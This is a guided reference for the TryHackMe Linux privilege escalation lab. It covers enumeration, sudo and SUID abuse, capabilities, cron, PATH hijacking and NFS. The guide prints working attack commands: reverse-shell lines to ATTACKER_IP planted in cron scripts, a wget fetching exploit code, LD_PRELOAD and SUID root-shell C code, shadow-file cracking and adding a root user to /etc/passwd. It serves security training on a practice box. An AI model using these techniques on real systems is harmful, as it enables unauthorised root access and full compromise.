# Session 6 — Linux Privilege Escalation (Guided Lab Reference)

> Source lab: TryHackMe — *Linux Privilege Escalation* (`linprivesc`)
> Starting point in most tasks: an **unprivileged shell** on the target (`karen` / `Password1`, via SSH or in-browser).
> Goal: escalate to **root**.

**Command legend**
- 🟢 **Target** = run on the compromised Linux victim (your low-priv shell / SSH).
- 🔴 **Attacker** = run on your Kali / AttackBox.

---

## Task 2 — What is Privilege Escalation?

**Concept.** Move from low privilege to higher (ideally root) by chaining a vulnerability or abusing misconfigurations and lax permissions. Two broad routes:
- **Vertical:** low-priv user → root.
- **Horizontal:** hop to another same-level user who has more info/access, then escalate.

There are no silver bullets — outcome depends on kernel version, installed software, languages present, and other users' leftovers.

---

## Task 3 — Enumeration (the foundation)

**Concept.** First thing after gaining any shell. Build a full picture before choosing a vector. *All commands 🟢 Target.*

### System / kernel
```bash
# 🟢 Target
hostname                 # host role hints (e.g. SQL-PROD-01)
uname -a                 # kernel version (for kernel exploits)
cat /proc/version        # kernel + compiler (gcc?) present
cat /etc/issue           # OS identification
```
### Processes / environment / privileges
```bash
# 🟢 Target
ps aux                   # all processes + owning users
ps axjf                  # process tree
env                      # environment vars (PATH, langs)
sudo -l                  # what we can run via sudo  <-- high value
```
### Users / files / network
```bash
# 🟢 Target
id                       # our uid/gid/groups (works on other users too)
cat /etc/passwd          # discover users (grep 'home' for real users)
history                  # past commands (sometimes creds)
ifconfig ; ip route      # interfaces / pivot networks
netstat -ano             # sockets, listening ports
ls -la                   # ALWAYS -la (hidden files like secret.txt)
```
### The `find` command (enumeration workhorse)
```bash
# 🟢 Target
find / -perm -u=s -type f 2>/dev/null   # SUID files  <-- high value
find / -writable -type d 2>/dev/null    # world-writable dirs
find / -name "*.conf" 2>/dev/null       # config files
find / -mtime -10 2>/dev/null           # modified in last 10 days
find / -name python* ; find / -name gcc*  # tools/compilers present
```
> `2>/dev/null` hides permission-denied noise.

---

## Task 4 — Automated Enumeration Tools

**Concept.** Speed up enumeration — but they can miss vectors, so learn a few.

| Tool | Runs on | Note |
|------|---------|------|
| **LinPEAS** | 🟢 Target | Broadest; very verbose. |
| **LinEnum** | 🟢 Target | Classic shell enum. |
| **LES** (Linux Exploit Suggester) | 🔴/🟢 | Kernel exploit suggestions (false +/-). |
| **linux-smart-enumeration (lse.sh)** | 🟢 Target | Tiered verbosity. |
| **linuxprivchecker** | 🟢 Target | Python-based. |

> Pick the tool the target can actually run (e.g. no Python → don't use a Python script).

---

## Task 5 — Kernel Exploits

**Concept.** The kernel runs with the highest privilege; a kernel exploit → root. Methodology:
1. Identify kernel version → 2. Find matching exploit → 3. Run it.
```bash
# 🟢 Target — identify
uname -a
cat /proc/version
```
```bash
# 🔴 Attacker — research + host the exploit
searchsploit linux kernel <version>      # or cvedetails.com / LES
python3 -m http.server                    # serve the exploit
```
```bash
# 🟢 Target — pull, compile, run
wget http://ATTACKER_IP:8000/exploit.c
gcc exploit.c -o exploit && ./exploit
```
> ⚠️ A failed kernel exploit can crash the box — confirm it's in scope, read the exploit first, don't be over-specific in searches.

---

## Task 6 — Sudo

**Concept.** `sudo` lets a user run specific programs as root. Misuse of that trust = escalation.
```bash
# 🟢 Target — what can we run?
sudo -l
```
Check each allowed binary on **GTFOBins** (https://gtfobins.github.io) for a shell escape.

### 6.1 GTFOBins shell escape (e.g. nmap)
```bash
# 🟢 Target — example if 'nmap' is allowed
sudo nmap --interactive        # then: !sh   → root shell
```

### 6.2 Leverage app functions to read files (e.g. Apache2)
No known escape, but you can *leak* file contents via a feature:
```bash
# 🟢 Target — feed /etc/shadow as a "config file"; error leaks its first line
sudo apache2 -f /etc/shadow
```

### 6.3 LD_PRELOAD (when env_keep has LD_PRELOAD)
**Idea.** Force sudo'd programs to load our malicious shared library first.
```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
```
```bash
# 🟢 Target — compile the .so, then preload it with any sudo-allowed program
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/shell.so find     # → root shell
```
> Ignored if real UID ≠ effective UID.

---

## Task 7 — SUID / SGID

**Concept.** SUID (`s` bit) makes a file run with the **file owner's** privilege, not the runner's. If a root-owned SUID binary can be abused → root.
```bash
# 🟢 Target — find SUID/SGID binaries, compare to GTFOBins (#+suid)
find / -type f -perm -04000 -ls 2>/dev/null
```

**Two classic paths when a text editor (e.g. nano) is SUID root:**

### 7.1 Read /etc/shadow and crack
```bash
# 🟢 Target — read shadow with the SUID editor
nano /etc/shadow          # copy the hashes out
```
```bash
# 🔴 Attacker — unshadow + crack
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=rockyou.txt passwords.txt
```

### 7.2 Add a root user to /etc/passwd (skip cracking)
```bash
# 🔴 Attacker — generate a password hash
openssl passwd -1 -salt abc password123
```
```bash
# 🟢 Target — append a UID 0 user with the SUID editor, then switch
# add line:  hacker:<hash>:0:0:root:/root:/bin/bash
nano /etc/passwd
su hacker                 # → root
```

---

## Task 8 — Capabilities

**Concept.** Capabilities give a binary *specific* root powers without full SUID. Abusable ones (e.g. `cap_setuid`) → root.
```bash
# 🟢 Target — list capabilities (redirect errors)
getcap -r / 2>/dev/null
```
Check results against GTFOBins. Example — `vim` with `cap_setuid`:
```bash
# 🟢 Target — spawn root shell via vim's Python
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'
```
> Note: vim here has a **capability**, not the SUID bit — so it won't show up in a SUID search.

---

## Task 9 — Cron Jobs

**Concept.** Cron runs scripts on a schedule as their **owner** (often root). If we can edit a root-owned scheduled script, our code runs as root.
```bash
# 🟢 Target — read system-wide cron table
cat /etc/crontab
```

### 9.1 Writable cron script
```bash
# 🟢 Target — if e.g. /path/backup.sh is writable, replace it with a reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/backup.sh
```
```bash
# 🔴 Attacker — catch it when cron fires
nc -lvp 4444
```

### 9.2 Missing script + relative PATH in cron
**Idea.** A cron entry calls a script by name only (no full path). Cron uses the `PATH` set in `/etc/crontab`. Create your own script earlier in that PATH.
```bash
# 🟢 Target — e.g. cron runs 'antivirus.sh' (deleted); create it in your home
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > ~/antivirus.sh
chmod +x ~/antivirus.sh
```
> Also worth checking: existing cron scripts using `tar`, `7z`, `rsync` (wildcard-injection tricks).

---

## Task 10 — PATH Hijacking

**Concept.** If a writable folder sits in `$PATH`, and a root SUID program calls another binary by name (no absolute path), drop a malicious binary of that name.
```bash
# 🟢 Target — inspect PATH + find writable dirs
echo $PATH
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```
Example: a SUID `path` binary that runs `thm`:
```bash
# 🟢 Target — put /tmp first, plant 'thm' = a bash copy, run the SUID program
export PATH=/tmp:$PATH
cp /bin/bash /tmp/thm && chmod +x /tmp/thm
./path                    # runs our /tmp/thm as root  → root shell
```

---

## Task 11 — NFS (no_root_squash)

**Concept.** NFS normally strips root on remote access (`root_squash`). If a share is exported with **`no_root_squash`** and is writable, we can create a root-owned SUID binary from our machine and run it on the target.
```bash
# 🟢 Target — read exports to spot no_root_squash
cat /etc/exports
```
```bash
# 🔴 Attacker — enumerate + mount the vulnerable share
showmount -e TARGET_IP
mkdir /tmp/nfs
mount -o rw TARGET_IP:/shared /tmp/nfs
```
```c
// nfs.c — simple SUID root shell
int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }
```
```bash
# 🔴 Attacker — compile inside the mounted share, set SUID (as root)
gcc /tmp/nfs/nfs.c -o /tmp/nfs/nfs
chmod +s /tmp/nfs/nfs
```
```bash
# 🟢 Target — the binary now has SUID root; run it
/shared/nfs               # → root shell
```

---

## Task 12 — Capstone Challenge

**Concept.** No new material — a full unassisted box. Apply the workflow end-to-end:
1. Enumerate (`id`, `sudo -l`, SUID, capabilities, cron, `/etc/exports`, kernel).
2. Pick the most promising vector.
3. Escalate to root and read the flags.

---

### Key takeaways
- **Enumeration first, always** — most Linux escalations come from `sudo -l`, SUID files, capabilities, cron, and NFS exports.
- **GTFOBins** is your reference for turning a single binary (sudo/SUID/cap) into a shell.
- Pattern for remote-assisted vectors: **build/compile on 🔴 Attacker → run on 🟢 Target → catch shell on 🔴 Attacker**.
- Prefer reverse shells over modifying the system during real engagements.
